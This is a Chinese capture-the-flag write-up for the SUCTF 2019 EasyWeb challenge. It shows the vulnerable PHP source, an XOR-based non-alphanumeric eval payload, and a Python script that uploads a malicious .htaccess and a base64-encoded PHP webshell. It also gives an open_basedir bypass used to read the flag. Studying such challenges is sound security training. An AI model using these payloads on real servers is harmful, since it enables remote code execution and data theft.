# [SUCTF 2019]EasyWeb

[题目地址](https://buuoj.cn/challenges#[SUCTF%202019]EasyWeb)

[wp](https://www.shawroot.cc/1840.html)已经讲的很好了，我再记个笔记，知识点多加深一下记忆。

```php
<?php
function get_the_flag(){
    // webadmin will remove your upload file every 20 min!!!! 
    $userdir = "upload/tmp_".md5($_SERVER['REMOTE_ADDR']);
    if(!file_exists($userdir)){
    mkdir($userdir);
    }
    if(!empty($_FILES["file"])){
        $tmp_name = $_FILES["file"]["tmp_name"];
        $name = $_FILES["file"]["name"];
        $extension = substr($name, strrpos($name,".")+1);
    if(preg_match("/ph/i",$extension)) die("^_^"); 
        if(mb_strpos(file_get_contents($tmp_name), '<?')!==False) die("^_^");
    if(!exif_imagetype($tmp_name)) die("^_^"); 
        $path= $userdir."/".$name;
        @move_uploaded_file($tmp_name, $path);
        print_r($path);
    }
}

$hhh = @$_GET['_'];

if (!$hhh){
    highlight_file(__FILE__);
}

if(strlen($hhh)>18){
    die('One inch long, one inch strong!');
}

if ( preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', $hhh) )
    die('Try something else!');

$character_type = count_chars($hhh, 3);
if(strlen($character_type)>12) die("Almost there!");

eval($hhh);
?>
```

这题分为几个阶段，第一个阶段是一个无数字字母rce。先看看这个正则留了什么可以用。

```php
<?php
for($a = 0; $a < 256; $a++){
    if (!preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', chr($a))){
        echo chr($a)." ";
    }
}
//! # $ % ( ) * + - / : ; < > ? @ \ ] ^ { }
```

留了异或，这题就不难了。形如`${_GET}{%f8}();&%f8=cmd`的payload需要的代码量最少且功能齐全，`_GET`被过滤了，但是可以用异或绕过。借用大佬的脚本计算异或值。

```php
<?php
$payload = '';
$x = '_GET';
for($i = 0; $i < strlen($x); $i++){
    for ($j = 0; $j < 255; $j++){
        $k = chr($j) ^ chr(248);
        if ($k == $x[$i]) {
            $payload .= '%'.dechex($j);
        }
    }
}
echo '%f8%f8%f8%f8^'.$payload;
?>
```

或者不用脚本计算，直接和0xFF异或，这样就相当于取反，直接一行代码搞定。

```php
<?php
echo urlencode("\xff\xff\xff\xff^".~"_GET");
```

这里因为长度限制在18以内，有用的函数只能执行phpinfo和题目自带的get_the_flag。先看phpinfo：

- ?_=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=phpinfo

不知道是不是buu配置环境时搞错了，phpinfo界面搜索flag直接就出来了。其实这一步预期解只是收集信息，还要利用get_the_flag函数传马。get_the_flag函数里面过滤了文件内容，不能包含`<?`；后缀里不能有ph；exif_imagetype()检测需要是图片。简单但有效的过滤，问题是.htaccess文件没过滤一切都白给。.htaccess文件绕后缀名这个见多了，绕文件内容则是用了耳熟能详的php伪协议。我们把马base64编码上传，然后.htaccess文件来上一句`php_value auto_append_file "php://filter/convert.base64-decode/resource=xxx"`把马baes64解码，这马就能正常用了。exif_imagetype()检测也好绕过，三种方法：

1. 在文件头部加上：

```
#define width 1337
#define height 1337 
```

数字随便填，仅适用于.htaccess文件。

2. 文件头部加上`\x00\x00\x8a\x39\x8a\x39`。
3. 文件头部加上`\x18\x81\x7c\xf5`，这样base64之后开头就是 GIF89a了。仅适用于base64编码的文件。

统一用第二种方法，两个文件的适用。脚本直接自动化，先上传一个.htaccess，再上传base64编码后的马。

```python
import requests
import hashlib
import base64

url ="http://d718e879-56e1-4300-98a0-7d36094a4eea.node4.buuoj.cn:81/"
padding = "?_=${%f8%f8%f8%f8^%a7%bf%bd%ac}{%f8}();&%f8=get_the_flag" #调用上传函数
myip=requests.get("http://ifconfig.me").text #http://ifconfig.me 这个网址可以获取ip等信息
ip_md5 = hashlib.md5(myip.encode()).hexdigest()
userdir="upload/tmp_"+ip_md5+"/"
#AddType application/x-httpd-php 后面的内容要和上传的木马后缀对应上。后缀本身是什么不重要，重要的是要一致
htaccess = b"""\x00\x00\x8a\x39\x8a\x39
AddType application/x-httpd-php .cc
php_value auto_append_file "php://filter/convert.base64-decode/resource=./shaw.cc"
"""
shaw = b"\x00\x00\x8a\x39\x8a\x39"+b"00"+ base64.b64encode(b"<?php eval($_GET['cmd']);?>")
files =[('file',('.htaccess',htaccess,'image/jpeg'))]

res = requests.post(url=url+padding,files=files)
files = [('file',('shaw.cc',shaw,'image/jpeg'))]
res = requests.post(url=url+padding,files=files)
print("the path is:"+url+res.text)
```

传上去后蚁剑连接会发现看不了flag。回到最开始的phpinfo，早已经告诉我们限制了访问路径：`open_basedir /var/www/html/:/tmp/`，只能访问tmp下的文件。大佬说蚁剑有插件可以绕，不过只支持linux，只能用[open_basedir bypass](https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/)了。去到上传的马的路径，传入cmd参数：

- ?cmd=mkdir('rot');chdir('rot');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(glob('*'));

能发现flag名为`THis_Is_tHe_F14g`，更改一下payload就能获取flag。

- ?cmd=mkdir('rot');chdir('rot');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(glob('*'));print_r(file_get_contents('/THis_Is_tHe_F14g'))

根据文章所说，ini_set('open_basedir','xxx')正常来说只能被调用一次，第一次设置过了那么第二次再设置是无法覆盖第一次的。这道题里第一次设置了`ini_set('open_basedir','/var/www/html/tmp')`，似乎我们无法将其再设置为flag所在的根目录了。且慢，我们可以在tmp目录下创建一个新的文件夹，名字随意，然后切进刚刚创建的文件夹，设置ini_set('open_basedir','..')。这样是不会有问题的，因为新建文件夹的`..`目录正是/var/www/html/tmp，没有跟第一次设置的冲突。然而设置open_basedir为..有个问题，..目录是会随时改变的，也就是说这时我们chdir('..')把目录往上切，切多少次都不会报错，我们确实一直在..目录下，只不过这个目录每次都在改变。根据当前路径不断调用chdir('..')往上切，当切到根目录下时，调用ini_set('open_basedir','/')，就能成功把open_basedir设为根目录了。